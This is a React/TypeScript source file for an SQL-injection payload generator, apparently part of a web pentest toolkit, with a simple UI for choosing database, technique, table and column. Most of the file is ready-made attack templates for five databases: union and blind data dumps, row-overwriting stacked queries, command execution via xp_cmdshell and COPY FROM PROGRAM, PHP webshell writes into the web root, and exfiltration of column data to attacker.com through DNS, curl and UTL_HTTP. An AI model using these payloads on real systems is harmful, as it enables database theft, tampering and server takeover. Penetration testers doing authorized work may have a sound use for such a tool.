import { useState, useMemo } from 'react'
import { Database } from '@phosphor-icons/react'
import { ToolLayout } from '../../components/ToolLayout'
import { PayloadList } from '../../components/PayloadList'
import type { PayloadItem } from '../../components/PayloadList'
import type { Tool } from '../types'

type DB        = 'MySQL' | 'MSSQL' | 'PostgreSQL' | 'Oracle' | 'SQLite'
type Technique = 'Union' | 'Boolean' | 'Time' | 'Error' | 'Stacked' | 'OOB'

const DBS:        DB[]        = ['MySQL', 'MSSQL', 'PostgreSQL', 'Oracle', 'SQLite']
const TECHNIQUES: Technique[] = ['Union', 'Boolean', 'Time', 'Error', 'Stacked', 'OOB']

interface Ctx {
  q:     string   // injection quote char (', ", or "")
  cols:  number   // column count for UNION
  table: string
  col:   string
  delay: number
  cmt:   string   // comment string
}

interface Payload {
  technique: Technique
  label:     string
  note?:     string
  build:     (ctx: Ctx) => string
}

// ----- helpers -----
const tbl  = (ctx: Ctx) => ctx.table || '[table]'
const col  = (ctx: Ctx) => ctx.col   || '[column]'

function nulls(n: number, vals: string[] = []): string {
  return Array.from({ length: n }, (_, i) => vals[i] ?? 'NULL').join(',')
}

// hex-encode a string for MySQL — avoids inner quote conflicts
function hex(s: string): string {
  if (!s) return "'[table]'"
  return '0x' + [...s].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
}

// MSSQL WAITFOR format
const msDelay = (s: number) => `'0:0:${s}'`

// ----- payload definitions -----

const MySQL: Payload[] = [
  // Union
  { technique: 'Union',   label: 'ORDER BY column count', build: ctx => `${ctx.q} ORDER BY ${ctx.cols}${ctx.cmt}` },
  { technique: 'Union',   label: 'NULL column probe',     build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols)}${ctx.cmt}` },
  { technique: 'Union',   label: 'Version / user / db',   build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['version()', 'user()', 'database()'])}${ctx.cmt}` },
  { technique: 'Union',   label: 'List databases',        build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['group_concat(schema_name)'])} FROM information_schema.schemata${ctx.cmt}` },
  { technique: 'Union',   label: 'List tables',           build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['group_concat(table_name)'])} FROM information_schema.tables WHERE table_schema=database()${ctx.cmt}` },
  { technique: 'Union',   label: 'List columns',          build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['group_concat(column_name)'])} FROM information_schema.columns WHERE table_name=${hex(ctx.table)}${ctx.cmt}` },
  { technique: 'Union',   label: 'Dump column',           build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, [`group_concat(${col(ctx)} SEPARATOR 0x0a)`])} FROM ${tbl(ctx)}${ctx.cmt}` },
  // Boolean
  { technique: 'Boolean', label: 'True condition',        build: ctx => `${ctx.q} AND 1=1${ctx.cmt}` },
  { technique: 'Boolean', label: 'False condition',       build: ctx => `${ctx.q} AND 1=2${ctx.cmt}` },
  { technique: 'Boolean', label: 'Table exists',          build: ctx => `${ctx.q} AND (SELECT COUNT(*) FROM ${tbl(ctx)})>0${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (db)',     build: ctx => `${ctx.q} AND SUBSTRING(database(),1,1)='a'${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (column)', build: ctx => `${ctx.q} AND (SELECT SUBSTRING(${col(ctx)},1,1) FROM ${tbl(ctx)} LIMIT 1)='a'${ctx.cmt}` },
  // Time
  { technique: 'Time',    label: 'Unconditional SLEEP',   build: ctx => `${ctx.q} AND SLEEP(${ctx.delay})${ctx.cmt}` },
  { technique: 'Time',    label: 'Conditional SLEEP',     build: ctx => `${ctx.q} AND IF(1=1,SLEEP(${ctx.delay}),0)${ctx.cmt}` },
  { technique: 'Time',    label: 'Table exists → sleep',  build: ctx => `${ctx.q} AND IF((SELECT COUNT(*) FROM ${tbl(ctx)})>0,SLEEP(${ctx.delay}),0)${ctx.cmt}` },
  { technique: 'Time',    label: 'Char match → sleep',    build: ctx => `${ctx.q} AND IF((SELECT SUBSTRING(${col(ctx)},1,1) FROM ${tbl(ctx)} LIMIT 1)='a',SLEEP(${ctx.delay}),0)${ctx.cmt}` },
  // Error
  { technique: 'Error',   label: 'extractvalue version',  build: ctx => `${ctx.q} AND extractvalue(1,concat(0x7e,(SELECT version())))${ctx.cmt}` },
  { technique: 'Error',   label: 'extractvalue database', build: ctx => `${ctx.q} AND extractvalue(1,concat(0x7e,(SELECT database())))${ctx.cmt}` },
  { technique: 'Error',   label: 'extractvalue tables',   build: ctx => `${ctx.q} AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))${ctx.cmt}` },
  { technique: 'Error',   label: 'extractvalue dump',     build: ctx => `${ctx.q} AND extractvalue(1,concat(0x7e,(SELECT group_concat(${col(ctx)}) FROM ${tbl(ctx)})))${ctx.cmt}` },
  { technique: 'Error',   label: 'updatexml version',     build: ctx => `${ctx.q} AND updatexml(1,concat(0x7e,(SELECT version())),1)${ctx.cmt}` },
  // Stacked
  { technique: 'Stacked', label: 'Sleep',                 build: ctx => `${ctx.q}; SELECT SLEEP(${ctx.delay})${ctx.cmt}` },
  { technique: 'Stacked', label: 'Insert row',            build: ctx => `${ctx.q}; INSERT INTO ${tbl(ctx)} (${col(ctx)}) VALUES ('pwned')${ctx.cmt}` },
  { technique: 'Stacked', label: 'Update all rows',       build: ctx => `${ctx.q}; UPDATE ${tbl(ctx)} SET ${col(ctx)}='pwned' WHERE 1=1${ctx.cmt}` },
  // OOB
  { technique: 'OOB',     label: 'DNS via load_file',     build: ctx => `${ctx.q} AND load_file(concat('\\\\\\\\',version(),'.attacker.com\\\\share'))${ctx.cmt}`, note: 'Requires FILE privilege and secure_file_priv unset' },
  { technique: 'OOB',     label: 'Write PHP webshell',    build: ctx => `${ctx.q}; SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'${ctx.cmt}`, note: 'Requires FILE privilege and writable web root' },
]

const MSSQL: Payload[] = [
  // Union
  { technique: 'Union',   label: 'ORDER BY column count', build: ctx => `${ctx.q} ORDER BY ${ctx.cols}${ctx.cmt}` },
  { technique: 'Union',   label: 'NULL column probe',     build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols)}${ctx.cmt}` },
  { technique: 'Union',   label: 'Version',               build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['@@version'])}${ctx.cmt}` },
  { technique: 'Union',   label: 'Current db / user',     build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['db_name()', 'user_name()'])}${ctx.cmt}` },
  { technique: 'Union',   label: 'List tables',           build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['table_name'])} FROM information_schema.tables${ctx.cmt}` },
  { technique: 'Union',   label: 'List columns',          build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['column_name'])} FROM information_schema.columns WHERE table_name='${tbl(ctx)}'${ctx.cmt}` },
  { technique: 'Union',   label: 'Dump column',           build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, [col(ctx)])} FROM ${tbl(ctx)}${ctx.cmt}` },
  // Boolean
  { technique: 'Boolean', label: 'True condition',        build: ctx => `${ctx.q} AND 1=1${ctx.cmt}` },
  { technique: 'Boolean', label: 'False condition',       build: ctx => `${ctx.q} AND 1=2${ctx.cmt}` },
  { technique: 'Boolean', label: 'Table exists',          build: ctx => `${ctx.q} AND (SELECT COUNT(*) FROM ${tbl(ctx)})>0${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (db)',     build: ctx => `${ctx.q} AND SUBSTRING(db_name(),1,1)='a'${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (column)', build: ctx => `${ctx.q} AND (SELECT TOP 1 SUBSTRING(${col(ctx)},1,1) FROM ${tbl(ctx)})='a'${ctx.cmt}` },
  // Time
  { technique: 'Time',    label: 'WAITFOR DELAY',         build: ctx => `${ctx.q}; WAITFOR DELAY ${msDelay(ctx.delay)}${ctx.cmt}` },
  { technique: 'Time',    label: 'Conditional WAITFOR',   build: ctx => `${ctx.q}; IF(1=1) WAITFOR DELAY ${msDelay(ctx.delay)}${ctx.cmt}` },
  { technique: 'Time',    label: 'Table exists → wait',   build: ctx => `${ctx.q}; IF((SELECT COUNT(*) FROM ${tbl(ctx)})>0) WAITFOR DELAY ${msDelay(ctx.delay)}${ctx.cmt}` },
  { technique: 'Time',    label: 'Char match → wait',     build: ctx => `${ctx.q}; IF((SELECT TOP 1 SUBSTRING(${col(ctx)},1,1) FROM ${tbl(ctx)})='a') WAITFOR DELAY ${msDelay(ctx.delay)}${ctx.cmt}` },
  // Error
  { technique: 'Error',   label: 'CONVERT version',       build: ctx => `${ctx.q} AND 1=CONVERT(int,@@version)${ctx.cmt}` },
  { technique: 'Error',   label: 'CONVERT table name',    build: ctx => `${ctx.q} AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))${ctx.cmt}` },
  { technique: 'Error',   label: 'CONVERT column dump',   build: ctx => `${ctx.q} AND 1=CONVERT(int,(SELECT TOP 1 ${col(ctx)} FROM ${tbl(ctx)}))${ctx.cmt}` },
  // Stacked
  { technique: 'Stacked', label: 'xp_cmdshell (RCE)',     build: ctx => `${ctx.q}; EXEC xp_cmdshell('whoami')${ctx.cmt}`, note: 'xp_cmdshell must be enabled' },
  { technique: 'Stacked', label: 'Enable xp_cmdshell',    build: ctx => `${ctx.q}; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE${ctx.cmt}`, note: 'Requires sysadmin role' },
  { technique: 'Stacked', label: 'Insert row',            build: ctx => `${ctx.q}; INSERT INTO ${tbl(ctx)} (${col(ctx)}) VALUES ('pwned')${ctx.cmt}` },
  { technique: 'Stacked', label: 'Linked server enum',    build: ctx => `${ctx.q}; EXEC sp_linkedservers${ctx.cmt}` },
  // OOB
  { technique: 'OOB',     label: 'DNS via xp_dirtree',    build: ctx => `${ctx.q}; EXEC master..xp_dirtree '//attacker.com/a'${ctx.cmt}` },
  { technique: 'OOB',     label: 'DNS with data exfil',   build: ctx => `${ctx.q}; DECLARE @d varchar(256); SET @d=(SELECT TOP 1 CAST(${col(ctx)} AS varchar(256)) FROM ${tbl(ctx)}); EXEC master..xp_dirtree '//'+@d+'.attacker.com/a'${ctx.cmt}` },
]

const PostgreSQL: Payload[] = [
  // Union
  { technique: 'Union',   label: 'ORDER BY column count', build: ctx => `${ctx.q} ORDER BY ${ctx.cols}${ctx.cmt}` },
  { technique: 'Union',   label: 'NULL column probe',     build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols)}${ctx.cmt}` },
  { technique: 'Union',   label: 'Version / user',        build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['version()', 'current_user'])}${ctx.cmt}` },
  { technique: 'Union',   label: 'List tables',           build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['table_name'])} FROM information_schema.tables WHERE table_schema='public'${ctx.cmt}` },
  { technique: 'Union',   label: 'List columns',          build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['column_name'])} FROM information_schema.columns WHERE table_name='${tbl(ctx)}'${ctx.cmt}` },
  { technique: 'Union',   label: 'Dump column',           build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, [`${col(ctx)}::text`])} FROM ${tbl(ctx)}${ctx.cmt}` },
  // Boolean
  { technique: 'Boolean', label: 'True condition',        build: ctx => `${ctx.q} AND 1=1${ctx.cmt}` },
  { technique: 'Boolean', label: 'False condition',       build: ctx => `${ctx.q} AND 1=2${ctx.cmt}` },
  { technique: 'Boolean', label: 'Table exists',          build: ctx => `${ctx.q} AND (SELECT COUNT(*) FROM ${tbl(ctx)})>0${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (db)',     build: ctx => `${ctx.q} AND SUBSTRING(current_database(),1,1)='a'${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (column)', build: ctx => `${ctx.q} AND (SELECT SUBSTRING(${col(ctx)}::text,1,1) FROM ${tbl(ctx)} LIMIT 1)='a'${ctx.cmt}` },
  // Time
  { technique: 'Time',    label: 'pg_sleep (stacked)',    build: ctx => `${ctx.q}; SELECT pg_sleep(${ctx.delay})${ctx.cmt}` },
  { technique: 'Time',    label: 'CASE WHEN table exists',build: ctx => `${ctx.q}; SELECT CASE WHEN (SELECT COUNT(*) FROM ${tbl(ctx)})>0 THEN pg_sleep(${ctx.delay}) ELSE pg_sleep(0) END${ctx.cmt}` },
  { technique: 'Time',    label: 'CASE WHEN char match',  build: ctx => `${ctx.q}; SELECT CASE WHEN (SELECT SUBSTRING(${col(ctx)}::text,1,1) FROM ${tbl(ctx)} LIMIT 1)='a' THEN pg_sleep(${ctx.delay}) ELSE pg_sleep(0) END${ctx.cmt}` },
  // Error
  { technique: 'Error',   label: 'CAST version',          build: ctx => `${ctx.q} AND 1=CAST(version() AS int)${ctx.cmt}` },
  { technique: 'Error',   label: 'CAST column dump',      build: ctx => `${ctx.q} AND 1=CAST((SELECT ${col(ctx)} FROM ${tbl(ctx)} LIMIT 1) AS int)${ctx.cmt}` },
  { technique: 'Error',   label: 'Integer overflow',      build: ctx => `${ctx.q} AND 1=1::int8*9999999999999999999${ctx.cmt}` },
  // Stacked
  { technique: 'Stacked', label: 'pg_sleep',              build: ctx => `${ctx.q}; SELECT pg_sleep(${ctx.delay})${ctx.cmt}` },
  { technique: 'Stacked', label: 'Insert row',            build: ctx => `${ctx.q}; INSERT INTO ${tbl(ctx)} (${col(ctx)}) VALUES ('pwned')${ctx.cmt}` },
  { technique: 'Stacked', label: 'COPY RCE',              build: ctx => `${ctx.q}; COPY ${tbl(ctx)} FROM PROGRAM 'id'${ctx.cmt}`, note: 'Requires superuser' },
  { technique: 'Stacked', label: 'Create extension',      build: ctx => `${ctx.q}; CREATE EXTENSION IF NOT EXISTS dblink${ctx.cmt}` },
  // OOB
  { technique: 'OOB',     label: 'dblink DNS',            build: ctx => `${ctx.q}; SELECT dblink_connect('host=attacker.com dbname=test user=a password=a')${ctx.cmt}`, note: 'Requires dblink extension' },
  { technique: 'OOB',     label: 'COPY to curl',          build: ctx => `${ctx.q}; COPY (SELECT ${col(ctx)} FROM ${tbl(ctx)} LIMIT 1) TO PROGRAM 'curl http://attacker.com/?d='||${col(ctx)}${ctx.cmt}` },
]

const Oracle: Payload[] = [
  // Union (all selects need FROM DUAL or a real table)
  { technique: 'Union',   label: 'ORDER BY column count',    build: ctx => `${ctx.q} ORDER BY ${ctx.cols}${ctx.cmt}` },
  { technique: 'Union',   label: 'NULL probe (DUAL)',        build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols)} FROM DUAL${ctx.cmt}` },
  { technique: 'Union',   label: 'Version (v$version)',      build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['banner'])} FROM v$version WHERE rownum=1${ctx.cmt}` },
  { technique: 'Union',   label: 'Current user',             build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['user'])} FROM DUAL${ctx.cmt}` },
  { technique: 'Union',   label: 'List tables (all_tables)', build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['table_name'])} FROM all_tables WHERE rownum=1${ctx.cmt}` },
  { technique: 'Union',   label: 'List columns',             build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['column_name'])} FROM all_tab_columns WHERE table_name=UPPER('${tbl(ctx)}') AND rownum=1${ctx.cmt}` },
  { technique: 'Union',   label: 'Dump column',              build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, [col(ctx)])} FROM ${tbl(ctx)} WHERE rownum=1${ctx.cmt}` },
  // Boolean
  { technique: 'Boolean', label: 'True condition',           build: ctx => `${ctx.q} AND 1=1${ctx.cmt}` },
  { technique: 'Boolean', label: 'False condition',          build: ctx => `${ctx.q} AND 1=2${ctx.cmt}` },
  { technique: 'Boolean', label: 'Table exists',             build: ctx => `${ctx.q} AND (SELECT COUNT(*) FROM ${tbl(ctx)})>0${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (user)',      build: ctx => `${ctx.q} AND SUBSTR(user,1,1)='A'${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (column)',    build: ctx => `${ctx.q} AND (SELECT SUBSTR(${col(ctx)},1,1) FROM ${tbl(ctx)} WHERE rownum=1)='a'${ctx.cmt}` },
  // Time (Oracle uses DBMS_PIPE, no SLEEP)
  { technique: 'Time',    label: 'dbms_pipe delay',          build: ctx => `${ctx.q} AND 1=dbms_pipe.receive_message('a',${ctx.delay})${ctx.cmt}`, note: 'Requires EXECUTE on DBMS_PIPE' },
  { technique: 'Time',    label: 'Conditional pipe delay',   build: ctx => `${ctx.q} AND (SELECT COUNT(*) FROM ${tbl(ctx)})>0 AND 1=dbms_pipe.receive_message('a',${ctx.delay})${ctx.cmt}` },
  { technique: 'Time',    label: 'Heavy query delay',        build: ctx => `${ctx.q} AND (SELECT COUNT(*) FROM all_objects t1, all_objects t2)>0${ctx.cmt}`, note: 'Unreliable — causes full cross-join' },
  // Error
  { technique: 'Error',   label: 'UTL_INADDR user exfil',   build: ctx => `${ctx.q} AND 1=utl_inaddr.get_host_name((SELECT user FROM DUAL))${ctx.cmt}`, note: 'Requires EXECUTE on UTL_INADDR' },
  { technique: 'Error',   label: 'CTXSYS exfil',            build: ctx => `${ctx.q} AND ctxsys.drithsx.sn(1,(SELECT user FROM DUAL))=1${ctx.cmt}` },
  { technique: 'Error',   label: 'XMLType error',            build: ctx => `${ctx.q} AND 1=XMLType((SELECT user FROM DUAL))${ctx.cmt}` },
  // OOB
  { technique: 'OOB',     label: 'UTL_HTTP user exfil',     build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, [`utl_http.request('http://attacker.com/'||user)`])} FROM DUAL${ctx.cmt}`, note: 'Requires EXECUTE on UTL_HTTP and ACL' },
  { technique: 'OOB',     label: 'UTL_HTTP column exfil',   build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, [`utl_http.request('http://attacker.com/?d='||(SELECT ${col(ctx)} FROM ${tbl(ctx)} WHERE rownum=1))`])} FROM DUAL${ctx.cmt}` },
]

const SQLite: Payload[] = [
  // Union
  { technique: 'Union',   label: 'ORDER BY column count',      build: ctx => `${ctx.q} ORDER BY ${ctx.cols}${ctx.cmt}` },
  { technique: 'Union',   label: 'NULL column probe',          build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols)}${ctx.cmt}` },
  { technique: 'Union',   label: 'Version',                    build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['sqlite_version()'])}${ctx.cmt}` },
  { technique: 'Union',   label: 'List tables (sqlite_master)',build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['name'])} FROM sqlite_master WHERE type='table'${ctx.cmt}` },
  { technique: 'Union',   label: 'Table schema / columns',     build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, ['sql'])} FROM sqlite_master WHERE type='table' AND name='${tbl(ctx)}'${ctx.cmt}` },
  { technique: 'Union',   label: 'Dump column',               build: ctx => `${ctx.q} UNION SELECT ${nulls(ctx.cols, [col(ctx)])} FROM ${tbl(ctx)} LIMIT 1${ctx.cmt}` },
  // Boolean
  { technique: 'Boolean', label: 'True condition',             build: ctx => `${ctx.q} AND 1=1${ctx.cmt}` },
  { technique: 'Boolean', label: 'False condition',            build: ctx => `${ctx.q} AND 1=2${ctx.cmt}` },
  { technique: 'Boolean', label: 'Table exists',               build: ctx => `${ctx.q} AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='${tbl(ctx)}')>0${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (version)',     build: ctx => `${ctx.q} AND SUBSTR(sqlite_version(),1,1)='3'${ctx.cmt}` },
  { technique: 'Boolean', label: 'Char extract (column)',      build: ctx => `${ctx.q} AND (SELECT SUBSTR(${col(ctx)},1,1) FROM ${tbl(ctx)} LIMIT 1)='a'${ctx.cmt}` },
  // Error
  { technique: 'Error',   label: 'RAISE ABORT with data',     build: ctx => `${ctx.q} UNION SELECT RAISE(ABORT,'sqli:'||(SELECT ${col(ctx)} FROM ${tbl(ctx)} LIMIT 1))${ctx.cmt}` },
  { technique: 'Error',   label: 'typeof 1/0',                build: ctx => `${ctx.q} AND typeof(1/0)='integer'${ctx.cmt}` },
  // Stacked
  { technique: 'Stacked', label: 'Insert row',                build: ctx => `${ctx.q}; INSERT INTO ${tbl(ctx)} (${col(ctx)}) VALUES ('pwned')${ctx.cmt}` },
  { technique: 'Stacked', label: 'ATTACH DB as webshell',     build: ctx => `${ctx.q}; ATTACH DATABASE '/var/www/html/shell.php' AS sh; CREATE TABLE sh.x(d TEXT); INSERT INTO sh.x(d) VALUES ('<?php system($_GET[cmd]);?>')${ctx.cmt}`, note: 'Requires write access to web root' },
  // OOB
  { technique: 'OOB',     label: 'writefile (load_extension)',build: ctx => `${ctx.q}; SELECT writefile('/var/www/html/shell.php','<?php system($_GET[cmd]);?>')${ctx.cmt}`, note: 'Only available if writefile extension is loaded' },
]

const DB_PAYLOADS: Record<DB, Payload[]> = { MySQL, MSSQL, PostgreSQL, Oracle, SQLite }

const DB_CMT: Record<DB, string> = {
  MySQL:      '-- -',
  MSSQL:      '--',
  PostgreSQL: '--',
  Oracle:     '--',
  SQLite:     '--',
}

// ----- colors -----

const TECH_ON: Record<Technique, string> = {
  Union:   'border-blue-500   text-blue-400   bg-blue-500/10',
  Boolean: 'border-green-500  text-green-400  bg-green-500/10',
  Time:    'border-orange-400 text-orange-400 bg-orange-400/10',
  Error:   'border-red-500    text-red-400    bg-red-500/10',
  Stacked: 'border-purple-400 text-purple-400 bg-purple-400/10',
  OOB:     'border-pink-500   text-pink-400   bg-pink-500/10',
}

const TECH_BADGE: Record<Technique, string> = {
  Union:   'bg-blue-500/20   text-blue-400',
  Boolean: 'bg-green-500/20  text-green-400',
  Time:    'bg-orange-400/20 text-orange-400',
  Error:   'bg-red-500/20    text-red-400',
  Stacked: 'bg-purple-400/20 text-purple-400',
  OOB:     'bg-pink-500/20   text-pink-400',
}

function SQLiTool() {
  const [db,       setDb]     = useState<DB>('MySQL')
  const [techs,    setTechs]  = useState<Set<Technique>>(new Set(['Union', 'Boolean', 'Time', 'Error']))
  const [quote,    setQuote]  = useState("'")
  const [cols,     setCols]   = useState(3)
  const [table,    setTable]  = useState('')
  const [colName,  setColName]= useState('')
  const [delay,    setDelay]  = useState(5)

  const toggleTech = (t: Technique) =>
    setTechs(prev => { const n = new Set(prev); if (n.has(t)) n.delete(t); else n.add(t); return n })

  const ctx: Ctx = useMemo(() => ({
    q:     quote,
    cols,
    table,
    col:   colName,
    delay,
    cmt:   ' ' + DB_CMT[db],
  }), [quote, cols, table, colName, delay, db])

  const items = useMemo<PayloadItem[]>(() =>
    DB_PAYLOADS[db]
      .filter(p => techs.has(p.technique))
      .map((p, i) => ({
        id:        String(i),
        badge:     p.technique,
        badgeClass: TECH_BADGE[p.technique],
        label:     p.label,
        value:     p.build(ctx),
        note:      p.note,
      })),
    [db, techs, ctx]
  )

  const QUOTES = [{ label: "' (single)", value: "'" }, { label: '" (double)', value: '"' }, { label: 'none (numeric)', value: '' }]

  return (
    <ToolLayout title="SQL Injection" description="Generate SQLi payloads by database and technique">
      <div className="flex flex-col gap-5 max-w-3xl">

        <div className="flex flex-col gap-1.5">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Database</span>
          <div className="flex border border-vs-border rounded overflow-hidden">
            {DBS.map(d => (
              <button key={d} onClick={() => setDb(d)}
                className={`flex-1 py-2 text-xs transition-colors ${db === d ? 'bg-vs-active text-vs-text' : 'bg-vs-sidebar text-vs-muted hover:bg-vs-hover'}`}>
                {d}
              </button>
            ))}
          </div>
        </div>

        <div className="flex flex-col gap-1.5">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Technique</span>
          <div className="flex gap-2 flex-wrap">
            {TECHNIQUES.map(t => (
              <button key={t} onClick={() => toggleTech(t)}
                className={`px-3 py-1 text-xs rounded border transition-colors ${techs.has(t) ? TECH_ON[t] : 'border-vs-border text-vs-muted hover:bg-vs-hover'}`}>
                {t}
              </button>
            ))}
          </div>
        </div>

        <div className="flex flex-col gap-3">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Context</span>
          <div className="flex flex-wrap gap-3">

            <div className="flex flex-col gap-1">
              <label className="text-vs-muted text-xs">Quote</label>
              <div className="flex border border-vs-border rounded overflow-hidden">
                {QUOTES.map(({ label, value }) => (
                  <button key={label} onClick={() => setQuote(value)}
                    className={`px-2.5 py-1.5 text-xs transition-colors ${quote === value ? 'bg-vs-active text-vs-text' : 'bg-vs-sidebar text-vs-muted hover:bg-vs-hover'}`}>
                    {label}
                  </button>
                ))}
              </div>
            </div>

            <div className="flex flex-col gap-1">
              <label className="text-vs-muted text-xs">Columns (UNION)</label>
              <div className="flex items-stretch border border-vs-border rounded overflow-hidden">
                <button onClick={() => setCols(c => Math.max(1, c - 1))} className="px-3 text-vs-muted hover:text-vs-text hover:bg-vs-hover transition-colors text-base leading-none">−</button>
                <span className="px-3 py-1.5 text-vs-text text-sm font-mono bg-vs-sidebar min-w-10 text-center border-x border-vs-border">{cols}</span>
                <button onClick={() => setCols(c => Math.min(20, c + 1))} className="px-3 text-vs-muted hover:text-vs-text hover:bg-vs-hover transition-colors text-base leading-none">+</button>
              </div>
            </div>

            <div className="flex flex-col gap-1">
              <label className="text-vs-muted text-xs">Delay (s)</label>
              <div className="flex items-stretch border border-vs-border rounded overflow-hidden">
                <button onClick={() => setDelay(d => Math.max(1, d - 1))} className="px-3 text-vs-muted hover:text-vs-text hover:bg-vs-hover transition-colors text-base leading-none">−</button>
                <span className="px-3 py-1.5 text-vs-text text-sm font-mono bg-vs-sidebar min-w-10 text-center border-x border-vs-border">{delay}</span>
                <button onClick={() => setDelay(d => Math.min(30, d + 1))} className="px-3 text-vs-muted hover:text-vs-text hover:bg-vs-hover transition-colors text-base leading-none">+</button>
              </div>
            </div>

          </div>

          <div className="flex gap-3">
            <div className="flex flex-col gap-1 flex-1">
              <label className="text-vs-muted text-xs">Target table <span className="opacity-60">(optional)</span></label>
              <input type="text" value={table} onChange={e => setTable(e.target.value)} placeholder="users"
                spellCheck={false}
                className="w-full bg-vs-sidebar border border-vs-border text-vs-text text-sm font-mono px-3 py-1.5 rounded outline-none focus:border-vs-accent transition-colors" />
            </div>
            <div className="flex flex-col gap-1 flex-1">
              <label className="text-vs-muted text-xs">Target column <span className="opacity-60">(optional)</span></label>
              <input type="text" value={colName} onChange={e => setColName(e.target.value)} placeholder="password"
                spellCheck={false}
                className="w-full bg-vs-sidebar border border-vs-border text-vs-text text-sm font-mono px-3 py-1.5 rounded outline-none focus:border-vs-accent transition-colors" />
            </div>
          </div>
        </div>

        <PayloadList items={items} emptyMessage="Toggle at least one technique above." />

      </div>
    </ToolLayout>
  )
}

export default {
  meta: {
    slug: 'sqli',
    name: 'SQL Injection',
    description: 'Generate SQLi payloads by database and technique',
    icon: Database,
    tags: ['web', 'pentest', 'bypass'],
  },
  Component: SQLiTool,
} satisfies Tool
